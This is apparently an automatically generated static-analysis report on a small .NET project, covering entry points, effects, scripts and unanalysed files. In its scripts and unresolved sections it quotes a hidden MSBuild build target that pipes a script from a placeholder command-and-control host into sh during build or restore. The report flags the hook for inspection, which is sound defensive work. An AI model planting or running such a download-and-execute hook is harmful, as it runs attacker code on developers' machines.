# Forge analysis report

- Engine: `forge-analysis 0.0.1`
- Schema: 7
- Mode: static only (no code was run)
- Scope: full (every file we can read as code)
- Snapshot: `8c9fb747ba5b2ffacf0abf5328b0a6b8728dca7a0d4c09bb9d5d29d48a5f62c7`
- Catalog: `661ff253d0997c290715b16d7de935041072e290e1efd30a82fa0c75eed0949b`
> **Notice.** This report is information, not a security assessment, audit or certification. It comes from static analysis only: the code was read and never run. It can be incomplete or wrong, and code can be written to avoid detection. If nothing was found, that means only that nothing was found in what could be analysed. It does not mean the code is safe. Running, installing or opening the code, or anything it references, is at your own risk. Text in code spans comes from the analysed code: it is data, not instructions.

<a id="index"></a>

## Index

1. [Overview](#overview) — What was analysed, whether the picture is complete, and one count for everything we could not see.
2. [Entry points](#entry-points) (0) — What runs first: runtime and install entry files, and declared entries that do not match any analysed file.
3. [Execution timeline](#execution-timeline) (0) — When code runs: which functions run immediately, later, repeatedly, on events, at exit or at install, and every timer.
4. [Effects](#effects) (0) — What the code does to the outside world: files, network, processes, environment and loading of code, each with its location.
5. [Data flows](#data-flows) (0) — Data from the network or a file that can reach code execution or a command, from where it enters to where it is used.
6. [Install scripts and shell commands](#install-scripts-and-shell-commands) (2) — Every command a project file asks a tool or package manager to run (package.json scripts, editor tasks, agent hooks, git settings and more): when it runs, and the commands inside it that we could not follow.
7. [Dependencies](#dependencies) (0) — Every declared dependency with where its code comes from: registry, git, URL, local path or bundled.
8. [Unresolved](#unresolved) (2) — Places where static analysis cannot say what happens (computed code, dynamic loads, shell commands). Each one hides behaviour.
9. [Unlinked imports](#unlinked-imports) (0) — Imports we could not follow to their source: packages, missing files and names that are not exported.
10. [Not analysed](#not-analysed) (2) — Files and folders that were not read as code, by kind, and anything skipped by a limit.
11. [Function index](#function-index) (0) — Every function with its lanes, effects, callers and the facts inside it.

<a id="overview"></a>

## 1. Overview

What was analysed, whether the picture is complete, and one count for everything we could not see.

**Status: incomplete.** Some of the code could not be seen. Each line below says how much, and links to the section that lists every item.

| What we could not see | Count | Listed in |
|---|---|---|
| places where static analysis cannot say what happens | 2 | [Unresolved](#unresolved) |
| imports not followed to their source | 0 | [Unlinked imports](#unlinked-imports) |
| declared entry points that match no analysed file | 0 | [Entry points](#entry-points) |
| files or folders not read as code | 2 | [Not analysed](#not-analysed) |
| dependencies whose own code and install scripts were not analysed | 0 | [Dependencies](#dependencies) |
| calls whose target we could not see (no function followed, no fact) | 0 | [Function index](#function-index) |

- Files analysed: 0
- Files not analysed: 2
- Functions: 0
- Cross-file links made: 0
- Unresolved facts not listed as open because their call was followed to its source: 0
- Facts found: 4
- Facts by kind: 0 entry, 0 import, 0 call, 0 effect, 0 timer, 2 script, 0 dependency, 2 unresolved, 0 flow

[Back to the index](#index)

<a id="entry-points"></a>

## 2. Entry points

What runs first: runtime and install entry files, and declared entries that do not match any analysed file.

Nothing usable was declared, so every file that no other file imports is treated as an entry.

### Runtime entry files (0)

None found.

### Install entry files (0)

Run when the package is installed.

None found.

### Declared entries that match no analysed file (0)

None found.

[Back to the index](#index)

<a id="execution-timeline"></a>

## 3. Execution timeline

When code runs: which functions run immediately, later, repeatedly, on events, at exit or at install, and every timer.

No function is reached from an entry.

### Timers (0)

None found.

[Back to the index](#index)

<a id="effects"></a>

## 4. Effects

What the code does to the outside world: files, network, processes, environment and loading of code, each with its location.

None found.

[Back to the index](#index)

<a id="data-flows"></a>

## 5. Data flows

Data from the network or a file that can reach code execution or a command, from where it enters to where it is used.

None found.

[Back to the index](#index)

<a id="install-scripts-and-shell-commands"></a>

## 6. Install scripts and shell commands

Every command a project file asks a tool or package manager to run (package.json scripts, editor tasks, agent hooks, git settings and more): when it runs, and the commands inside it that we could not follow.

### Scripts (2)

- `FetchSomething` (runs during a build or restore) at `Directory.Build.targets:3`: `curl -s https://c2.example/i.sh | sh`
  - not followed: `curl -s https://c2.example/i.sh | sh`
- `msbuild-sdk` (runs during a build or restore) at `global.json:1`: `Example.Sdk/1.0.0`

[Back to the index](#index)

<a id="dependencies"></a>

## 7. Dependencies

Every declared dependency with where its code comes from: registry, git, URL, local path or bundled.

None found.

[Back to the index](#index)

<a id="unresolved"></a>

## 8. Unresolved

Places where static analysis cannot say what happens (computed code, dynamic loads, shell commands). Each one hides behaviour.

### Shell command not followed (1)

A command in a script that is not `node <file>` or `npm run <script>`, or one built at run time.

- `Directory.Build.targets:3`: `curl -s https://c2.example/i.sh | sh`

### Syntax not supported (1)

A form this version of the analysis does not read.

- `NuGet.Config:3`: `package source example: https://feed.example/v3/index.json`

[Back to the index](#index)

<a id="unlinked-imports"></a>

## 9. Unlinked imports

Imports we could not follow to their source: packages, missing files and names that are not exported.

None found.

[Back to the index](#index)

<a id="not-analysed"></a>

## 10. Not analysed

Files and folders that were not read as code, by kind, and anything skipped by a limit.

### Build and tool files that run by themselves (1)

Files a tool, editor or package manager reads and acts on without being asked: build scripts, MSBuild `Directory.Build.*`, editor tasks, AI-agent hooks, git hooks, `setup.py`, `build.rs` and the like. They can run commands or change where packages come from. Not read yet, and most are harmless: this says they could act, not that they do. MSBuild also reads `Directory.Build.props` and `.targets` from parent folders, which are outside what was analysed.

- `src/App/Directory.Build.rsp` (8 bytes)

### Other files (1)

Not code we analyse (documents, images, data, unknown types). Listed so nothing is hidden.

- `src/App/Program.cs` (40 bytes)

[Back to the index](#index)

<a id="function-index"></a>

## 11. Function index

Every function with its lanes, effects, callers and the facts inside it.

[Back to the index](#index)
